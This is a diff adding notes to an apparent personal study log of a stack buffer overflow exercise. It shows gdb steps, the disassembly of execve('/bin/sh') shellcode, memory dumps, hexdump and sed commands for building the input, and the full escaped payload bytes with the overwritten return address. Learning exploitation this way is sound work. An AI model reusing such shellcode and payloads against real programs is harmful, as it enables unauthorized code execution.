@@ -1005,4 +1005,71 @@ $5 = 0xbffff37c
 0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000
 (gdb) 
 
+Ok. so that works.  Here is the process from the start
+$ ./runit.sh
+$ ./gdbit.sh
+switch to runit, enter AAAA
+switch to gdb
+next until tmp assignment.
+source patch6.gdb
+next
+layout next until you get mixed assembly and source
+stepi through the code.
+
+right before we do the int80 here is what we have
+(gdb) disas 0xbffff350, +24
+Dump of assembler code from 0xbffff350 to 0xbffff368:
+   0xbffff350:  jmp    0xbffff36f
+   0xbffff352:  pop    %esp
+   0xbffff353:  mov    %esp,%ebx
+   0xbffff355:  add    $0x8,%esp
+   0xbffff358:  mov    %ebx,(%esp)
+   0xbffff35b:  mov    %esp,%ecx
+   0xbffff35d:  mov    %ecx,%eax
+   0xbffff35f:  add    $0x4,%eax
+   0xbffff362:  xor    %edx,%edx
+   0xbffff364:  mov    %edx,(%eax)
+   0xbffff366:  xor    %eax,%eax
+End of assembler dump.
+
+(gdb) print /x $eax
+$7 = 0xb
+(gdb) print /x $ebx
+$8 = 0xbffff374
+(gdb) print /x $ecx
+$9 = 0xbffff37c
+(gdb) print /x $edx
+$10 = 0x0
+
+(gdb) x/24xw 0xbffff330    
+0xbffff330:     0x35313737      0x34303930      0x41410038      0x41414141
+0xbffff340:     0xbffff350      0x42424242      0x42424242      0x42424242
+0xbffff350:     0x895c1deb      0x08c483e3      0x89241c89      0x83c889e1
+0xbffff360:     0xd23104c0      0xc0311089      0xc083c289      0xe880cd0b
+0xbffff370:     0xffffffde      0x6e69622f      0x0068732f      0xbffff374
+0xbffff380:     0x00000000      0x00000000      0x00000000      0x00000000
+(gdb) 
+
+
+Now to build the buffer for stdin.  I don't know how to print \ for each char
+in hexdump so I print a Y and replace it with \ afterwards.
+
+# To see you are in right location.
+# $ hexdump -s 0x110 -v -e'/1 "Y0x%02x"' testya3.o  > foo.txt
+$ hexdump -s 0x110 -v -e'/1 "Yx02x"' testya3.o  > foo.txt
+$ sed -i 's/Y/\\/g'  foo.txt
+
+Then I edit with vim to find the first 0x00 after the null term string for s.
+
+\x37\x37\x31\x35\x30\x39\x30\x34\x38\x00\x41\x41\x41\x41\x41\x41\x50\xf3\xff\xbf\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
+
+
+Notice this buffer will have the leading s in hex instead of the ascii chars.  
+Ditto for the markers.  You can touch it up if you wish.
+
+
+Using this approach on the original problem where we are doing a strcpy.
+----------------------------------------------------------------------------
+
+
 
